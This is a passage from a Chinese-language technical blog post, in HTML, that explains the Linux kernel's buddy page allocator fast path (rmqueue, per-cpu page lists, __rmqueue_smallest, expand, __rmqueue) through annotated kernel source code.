class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 从给定 zone 中进行内存分配. 对于 order-0 的分配则使用 pcplists.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span><br><span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">rmqueue</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> zone *preferred_zone,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order,</span><br><span class="hljs-params"><span class="hljs-type">gfp_t</span> gfp_flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags,</span><br><span class="hljs-params"><span class="hljs-type">int</span> migratetype)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br><span class="hljs-keyword">if</span> (likely(order == <span class="hljs-number">0</span>)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * MIGRATE_MOVABLE 的 pcplist 可能在 CMA 区域有着页面，</span><br><span class="hljs-comment"> * 当从 CMA 的分配不被允许时我们需要略过它</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">// 对于 order-0 的分配，</span><br>        <span class="hljs-comment">// 若没有开启 CMA | 设置了 ALLOC_CMA | 迁移类型非 MIGRATE_MOVABLE</span><br>        <span class="hljs-comment">// 则先从 pcplist 上分配</span><br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_CMA) || alloc_flags &amp; ALLOC_CMA ||<br>migratetype != MIGRATE_MOVABLE) &#123;<br>page = rmqueue_pcplist(preferred_zone, zone, gfp_flags,<br>migratetype, alloc_flags);<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们绝不希望 callers 尝试</span><br><span class="hljs-comment"> * 在带有 __GFP_NOFAIL 时分配大于 order-1 的页</span><br><span class="hljs-comment"> */</span><br>WARN_ON_ONCE((gfp_flags &amp; __GFP_NOFAIL) &amp;&amp; (order &gt; <span class="hljs-number">1</span>));<br>spin_lock_irqsave(&amp;zone-&gt;lock, flags);<br><br><span class="hljs-keyword">do</span> &#123;<br>page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若由于非CMA的分配上下文导致略过了 pcplist，则order-0 的请求可以到达此处.</span><br><span class="hljs-comment"> * HIGHATOMIC 区域为更高 order 的原子分配所保留，</span><br><span class="hljs-comment"> * 故 order-0 的请求应略过它。</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">// 若 order &gt; 0 且带有 ALLOC_HARDER 标志位，调用 __rmqueue_smallest() 分配</span><br>        <span class="hljs-comment">// 这个标志位意为将水位线减去 1/4，实际上 GFP_ATOMIC 中便会包含该标志位</span><br><span class="hljs-keyword">if</span> (order &gt; <span class="hljs-number">0</span> &amp;&amp; alloc_flags &amp; ALLOC_HARDER) &#123;<br>page = __rmqueue_smallest(zone, order, MIGRATE_HIGHATOMIC);<br><span class="hljs-keyword">if</span> (page)<br>trace_mm_page_alloc_zone_locked(page, order, migratetype);<br>&#125;<br>        <span class="hljs-comment">// 调用 __rmqueue() 进行分配，这个就是真正的核心分配函数了</span><br><span class="hljs-keyword">if</span> (!page)<br>page = __rmqueue(zone, order, migratetype, alloc_flags);<br>&#125; <span class="hljs-keyword">while</span> (page &amp;&amp; check_new_pages(page, order)); <span class="hljs-comment">// 这个检查函数通过了返回false</span><br>spin_unlock(&amp;zone-&gt;lock);<br><span class="hljs-keyword">if</span> (!page)<br><span class="hljs-keyword">goto</span> failed;<br>__mod_zone_freepage_state(zone, -(<span class="hljs-number">1</span> &lt;&lt; order),<br>  get_pcppage_migratetype(page));<br><br>__count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="hljs-number">1</span> &lt;&lt; order);<br>zone_statistics(preferred_zone, zone);<br>local_irq_restore(flags);<br><br>out:<br><span class="hljs-comment">/* Separate test+clear to avoid unnecessary atomics */</span><br><span class="hljs-keyword">if</span> (test_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags)) &#123;<br>clear_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags);<br>wakeup_kswapd(zone, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, zone_idx(zone));<br>&#125;<br><br>VM_BUG_ON_PAGE(page &amp;&amp; bad_range(zone, page), page);<br><span class="hljs-keyword">return</span> page;<br><br>failed:<br>local_irq_restore(flags);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析函数流程前我们先回顾一下这个概念——<code>per-cpu pageset</code> ，这是 zone 上的一个 per-cpu 的页面集，在分配时会优先从这里进行分配</p><p>该函数其实还是对分配的核心逻辑的封装，主要是以下流程：</p><ul><li>分配的 order 为 0，若没有开启 CMA | 设置了 ALLOC_CMA | 迁移类型非 MIGRATE_MOVABLE，则尝试从 per-cpu pageset 中分配并返回</li><li>order &gt; 0，调用 <code>__rmqueue_smallest()</code> 进行页面分配</li><li>之前未分配成功，调用 <code>__rmqueue()</code> 进行页面分配</li><li>结果检查，其中循环内是用 <code>check_new_pages()</code>，未通过则重新循环（回到第二步）</li></ul><h5 id="①-rmqueue-pcplist-：从-per-cpu-pageset-上做-order-0-的分配"><a href="#①-rmqueue-pcplist-：从-per-cpu-pageset-上做-order-0-的分配" class="headerlink" title="① rmqueue_pcplist()：从 per-cpu pageset 上做 order-0 的分配"></a>① rmqueue_pcplist()：从 per-cpu pageset 上做 order-0 的分配</h5><p>主要是关中断→页面分配→开中断三步走，最后分配调用到的是 <code>__rmqueue_pcplist()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Lock and remove page from the per-cpu list */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">rmqueue_pcplist</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> zone *preferred_zone,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">gfp_t</span> gfp_flags,</span><br><span class="hljs-params"><span class="hljs-type">int</span> migratetype, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pages</span> *<span class="hljs-title">pcp</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">list</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><br>local_irq_save(flags); <span class="hljs-comment">// 关中断</span><br>pcp = &amp;this_cpu_ptr(zone-&gt;pageset)-&gt;pcp;<br><span class="hljs-built_in">list</span> = &amp;pcp-&gt;lists[migratetype]; <span class="hljs-comment">// 获取迁移类型链表</span><br>page = __rmqueue_pcplist(zone,  migratetype, alloc_flags, pcp, <span class="hljs-built_in">list</span>); <span class="hljs-comment">// 分配</span><br><span class="hljs-keyword">if</span> (page) &#123;<br>__count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="hljs-number">1</span>);<br>zone_statistics(preferred_zone, zone);<br>&#125;<br>local_irq_restore(flags); <span class="hljs-comment">// 开中断</span><br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>__rmqueue_pcplist()</code> 主要就是一个大循环，若 pcplist 为空则调用 <code>rmqueue_bulk()</code> 先从 zone 上拿 pages，之后就是简单的链表脱链，分配结果使用 <code>check_new_page()</code> 进行检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 从 per-cpu 链表上取出 page, 调用者必须保护链表 */</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *__<span class="hljs-title">rmqueue_pcplist</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>, <span class="hljs-title">int</span> <span class="hljs-title">migratetype</span>,</span><br><span class="hljs-class"><span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">alloc_flags</span>,</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pages</span> *<span class="hljs-title">pcp</span>,</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">list</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">if</span> (list_empty(<span class="hljs-built_in">list</span>)) &#123; <span class="hljs-comment">// list 是空的</span><br>            <span class="hljs-comment">// </span><br>pcp-&gt;count += rmqueue_bulk(zone, <span class="hljs-number">0</span>,<br>READ_ONCE(pcp-&gt;batch), <span class="hljs-built_in">list</span>,<br>migratetype, alloc_flags);<br><span class="hljs-keyword">if</span> (unlikely(list_empty(<span class="hljs-built_in">list</span>)))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>        <span class="hljs-comment">// 链表脱链</span><br>page = list_first_entry(<span class="hljs-built_in">list</span>, <span class="hljs-keyword">struct</span> page, lru);<br>list_del(&amp;page-&gt;lru);<br>pcp-&gt;count--;<br>&#125; <span class="hljs-keyword">while</span> (check_new_pcp(page));<br><br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>rmqueue_bulk()</code> 则最终会调用到 <code>__rmqueue()</code> 为 pcplist 进行 <code>pcp-&gt;batch</code> 次的 order-0 的页面分配，并建立链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 为了高效率，从 buddy 分配器获得指定数量的元素, </span><br><span class="hljs-comment"> * 所有的单个元素都在持有锁的情况下进行.  将其添加到提供的链表中.</span><br><span class="hljs-comment"> * 返回放置在 *list 链表上的 pages 数量.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">rmqueue_bulk</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> count, <span class="hljs-keyword">struct</span> list_head *<span class="hljs-built_in">list</span>,</span><br><span class="hljs-params"><span class="hljs-type">int</span> migratetype, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags)</span><br>&#123;<br><span class="hljs-type">int</span> i, alloced = <span class="hljs-number">0</span>;<br><br>spin_lock(&amp;zone-&gt;lock);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; count; ++i) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> __rmqueue(zone, order, migratetype,<br>alloc_flags);<br><span class="hljs-keyword">if</span> (unlikely(page == <span class="hljs-literal">NULL</span>))<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">if</span> (unlikely(check_pcp_refill(page)))<br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 由 expand() 返回的分割 buddy 页面在此处以物理页框顺序接收。</span><br><span class="hljs-comment"> * 页面被添加到 caller 的链表尾部。从 caller 的角度看，链表在</span><br><span class="hljs-comment"> * 某些情况下是按照页码排序的。这对一些可以从头部前向的IO设备是有用的，</span><br><span class="hljs-comment"> * 因为链表也是在物理页的顺序上的。这对于可以在物理页合理排序的情况下</span><br><span class="hljs-comment"> * 合并IO请求的IO设备是有用的。</span><br><span class="hljs-comment"> */</span><br>list_add_tail(&amp;page-&gt;lru, <span class="hljs-built_in">list</span>);<br>alloced++;<br><span class="hljs-keyword">if</span> (is_migrate_cma(get_pcppage_migratetype(page)))<br>__mod_zone_page_state(zone, NR_FREE_CMA_PAGES,<br>      -(<span class="hljs-number">1</span> &lt;&lt; order));<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * i pages were removed from the buddy list even if some leak due</span><br><span class="hljs-comment"> * to check_pcp_refill failing so adjust NR_FREE_PAGES based</span><br><span class="hljs-comment"> * on i. Do not confuse with &#x27;alloced&#x27; which is the number of</span><br><span class="hljs-comment"> * pages added to the pcp list.</span><br><span class="hljs-comment"> */</span><br>__mod_zone_page_state(zone, NR_FREE_PAGES, -(i &lt;&lt; order));<br>spin_unlock(&amp;zone-&gt;lock);<br><span class="hljs-keyword">return</span> alloced;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="②-rmqueue-smallest-：遍历指定-migrationtype-链表的-buddy-算法（核心中的核心）"><a href="#②-rmqueue-smallest-：遍历指定-migrationtype-链表的-buddy-算法（核心中的核心）" class="headerlink" title="② __rmqueue_smallest()：遍历指定 migrationtype 链表的 buddy 算法（核心中的核心）"></a>② __rmqueue_smallest()：遍历指定 migrationtype 链表的 buddy 算法（核心中的核心）</h5><p>我们重新来回顾一下 <code>free_area</code> 的结构，在其中根据迁移类型分成了多个链表：</p><p><img src="https://i.loli.net/2021/11/30/sbNImKo6tBS5GUe.png" alt="自己画的图.png"></p><p>而一个 zone 是由多个 <code>free_area</code> 组成的，一个 <code>free_area</code> 对应一个 order，那么对于该函数而言其只会遍历特定的 order，那么就成了下面的模型：</p><p><img src="https://i.loli.net/2021/11/30/sOwdI5YMNUjLSib.png" alt="自己画的图.png"></p><p>现在我们可以以来看这个函数了：从待分配 order 所对应的 <code>free_area</code> 的指定的 migration type 链表上分配，若不够则一直向更高 order 进行分配后对半向下拆到低 order，这里向更高 order 分配是通过简单的循环 + 链表脱链操作完成的，而拆高阶 page 的操作则是通过 <code>expand()</code> 完成的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 对给定的 migrationtype 遍历 free lists </span><br><span class="hljs-comment"> * 并从 freelists 上移除最小可用的页面</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *__<span class="hljs-title">rmqueue_smallest</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">order</span>,</span><br><span class="hljs-class"><span class="hljs-title">int</span> <span class="hljs-title">migratetype</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> current_order;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span> *<span class="hljs-title">area</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br><span class="hljs-comment">/* 在 preferred list 上寻找一个合适 size 的 page */</span><br><span class="hljs-keyword">for</span> (current_order = order; current_order &lt; MAX_ORDER; ++current_order) &#123;<br>area = &amp;(zone-&gt;free_area[current_order]);<br>page = get_page_from_free_area(area, migratetype);<br><span class="hljs-keyword">if</span> (!page)<br><span class="hljs-keyword">continue</span>;<br>del_page_from_free_list(page, zone, current_order);<br>expand(zone, page, order, current_order, migratetype);<br>set_pcppage_migratetype(page, migratetype);<br><span class="hljs-keyword">return</span> page;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>expand()</code> 的逻辑就比较简单，从高阶 order 一直循环到待分配的 order：</p><ul><li>首先高阶 order–，之后页面拆两半，把后半部分挂到链表上，前半部分留到下次循环继续拆</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 此处再分割的顺序对 IO subsystem 而言是十分重要的.</span><br><span class="hljs-comment"> * 请不要在有好的理由及回归测试前改变这个顺序。</span><br><span class="hljs-comment"> * 特别地，当大块的内存被分割，更小块（内存）被传递的顺序</span><br><span class="hljs-comment"> * 则由他们在该函数中被分割的顺序决定。</span><br><span class="hljs-comment"> * 根据实际测试，这是影响传递给IO子系统的 pages 顺序的主要因素，</span><br><span class="hljs-comment"> * 考虑到包含一个内存大块（由一系列小的分配作用）的 buddy system 的行为，</span><br><span class="hljs-comment"> * 这也是合理的。这种行为是 sglist 合并成功的关键因素。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * -- nyc</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">expand</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-keyword">struct</span> page *page,</span><br><span class="hljs-params"><span class="hljs-type">int</span> low, <span class="hljs-type">int</span> high, <span class="hljs-type">int</span> migratetype)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> size = <span class="hljs-number">1</span> &lt;&lt; high;<br><br><span class="hljs-keyword">while</span> (high &gt; low) &#123;<br>high--;<br>size &gt;&gt;= <span class="hljs-number">1</span>;<br>VM_BUG_ON_PAGE(bad_range(zone, &amp;page[size]), &amp;page[size]);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 标记为 guard pages (或 page), 这将允许在 buddy 将被</span><br><span class="hljs-comment"> * 释放时合并回分配器.对应的页表项不会被创建，</span><br><span class="hljs-comment"> * pages 在 虚拟地址空间上仍将保持不存在。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (set_page_guard(zone, &amp;page[size], high, migratetype))<br><span class="hljs-keyword">continue</span>;<br><br>add_to_free_list(&amp;page[size], zone, high, migratetype);<br>set_buddy_order(&amp;page[size], high);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="③-rmqueue-：分配封装函数"><a href="#③-rmqueue-：分配封装函数" class="headerlink" title="③ __rmqueue()：分配封装函数"></a>③ __rmqueue()：分配封装函数</h5><p>这个函数其实主要是对其他分配函数的封装，最终的核心函数其实都还是 <code>__rmqueue_smallest()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 从 buddy allocator 上移除一个元素.</span><br><span class="hljs-comment"> * 在持有 zone-&gt;lock 时调用.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *</span><br><span class="hljs-class">__<span class="hljs-title">rmqueue</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">order</span>, <span class="hljs-title">int</span> <span class="hljs-title">migratetype</span>,</span><br><span class="hljs-class"><span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">alloc_flags</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_CMA)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 通过当半数空闲内存在 CMA 区域时从 CMA 中分配</span><br><span class="hljs-comment"> * 以平衡常规的与CMA区域的可迁移的分配。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_CMA &amp;&amp;<br>    zone_page_state(zone, NR_FREE_CMA_PAGES) &gt;<br>    zone_page_state(zone, NR_FREE_PAGES) / <span class="hljs-number">2</span>) &#123;<br>page = __rmqueue_cma_fallback(zone, order);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>&#125;<br>retry:<br>page = __rmqueue_smallest(zone, order, migratetype);<br><span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_CMA)<br>page = __rmqueue_cma_fallback(zone, order);<br><br><span class="hljs-keyword">if</span> (!page &amp;&amp; __rmqueue_fallback(zone, order, migratetype,<br>alloc_flags))<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br>out:<br><span class="hljs-keyword">if</span> (page)<br>trace_mm_page_alloc_zone_locked(page, order, migratetype);<br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><p>流程如下：</p><ul><li>若开启了 CMA，比对常规区域与 CMA 区域的空闲页面数量，若 CMA 的多则调用 <code>__rmqueue_cma_fallback()</code> 从 CMA 区域分配（其实就是调用 <code>__rmqueue_smallest()</code> 从迁移类型为 <code>MIGRATE_CMA</code> 的链表上分配），成功则直接返回</li><li>调用 <code>__rmqueue_smallest()</code> 从指定迁移类型链表进行分配，若未成功：<ul><li>若设置了 <code>ALLOC_CMA</code> 的分配 flag，调用 <code>__rmqueue_cma_fallback()</code> 从 CMA 区域进行分配</li><li>若上一步失败则调用 <code>__rmqueue_fallback()</code> 尝试从其他迁移类型链表获取页面，若还是失败则重试这一个大步骤</li></ul></li></ul><h3 id="III-alloc-pages-slowpath-：慢速分配路径"><a href="#III-alloc-pages-slowpath-：慢速分配路径" class="headerlink" title="III. __alloc_pages_slowpath()：慢速分配路径"></a>III. __alloc_pages_slowpath()：慢速分配路径</h3><p>当快速路径的分配不成功时，说明系统当前可能已经没有足够的连续的空闲页面，这时我们就要进入到慢速路径的分配，<strong>进行内存碎片整理与内存回收</strong>，之后再进行分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span 